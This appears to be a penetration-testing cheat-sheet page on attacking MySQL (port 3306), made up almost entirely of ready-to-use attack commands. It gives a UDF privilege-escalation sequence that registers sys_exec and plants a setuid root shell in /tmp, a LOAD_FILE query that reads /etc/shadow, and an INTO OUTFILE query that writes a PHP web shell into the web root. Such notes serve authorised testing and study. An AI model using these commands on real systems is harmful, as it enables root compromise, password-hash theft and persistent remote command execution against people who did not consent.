---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/penetration-testing/enumeration/service-ports/mysql-3306
---

# MySQL (3306)

## MYSQL PrivEsc

```basic
select @@plugin_dir
select binary 0xshellcode into dumpfile @@plugin_dir;
create function sys_exec returns int soname udf_filename;
select * from mysql.func where name='sys_exec';
select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
```

## Load File

```basic
select LOAD_FILE("/etc/shadow");
```

## Out File

```basic
MySQL Query: select '<?php $output=shell_exec($_GET["cmd"]);echo
"<pre>".$output."</pre>"?>' into outfile '/var/www/html/shell.php' from mysql.user limit 1;

```

<figure><img src="../../../../.gitbook/assets/image (620).png" alt=""><figcaption></figcaption></figure>
